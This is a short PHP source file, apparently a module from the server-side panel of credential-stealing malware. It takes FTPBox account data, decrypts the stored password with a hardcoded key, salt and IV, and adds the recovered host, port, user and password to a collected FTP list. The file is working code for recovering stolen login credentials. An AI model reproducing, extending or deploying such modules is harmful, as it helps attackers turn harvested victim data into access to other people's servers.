<?php
	class Module_ftpbox extends Module_
	{
		protected function Decrypt($Pass)
		{
			$Keyd = PBKDF1(
			"osj21svGzo8wcU6t05Z3M9nRPQFfStToE3yE0vmASoijdasd9asd7AIPOQtNT5zWIfvhGaLJZ19m", 
			"ASOIDoIajsda*DUaksdOASD8aSDASDAS&DASDKjoisadjasdAS&DYAKsdoaSD&SD*&A^SDajsdoIASD&", 2, 256/8);
			
			$Iv = "OFRna73m*aze01xY";
			
			return mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $Keyd.hex2bin("9D75591EEC85311C37A5923C"), base64_decode($Pass), MCRYPT_MODE_CBC, $Iv);
		}
		protected function ProcessFTPBox($Data)
		{
			$JSON_ = json_decode($Data, TRUE);
			if(isset($JSON_[0]['Account']))
			{
				$User = Assign_($JSON_[0]['Account']['Username']);
				$Pass = $this->Decrypt($JSON_[0]['Account']['Password']);
				$Host = Assign_($JSON_[0]['Account']['Host']);
				$Port = Assign_($JSON_[0]['Account']['Port']);
				$Prot = Assign_($JSON_[0]['Account']['Protocol']);
				
				$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 1) , $Port), $User, $Pass);
			}
			$JSON_ = NULL;
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->ProcessFTPBox($Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}

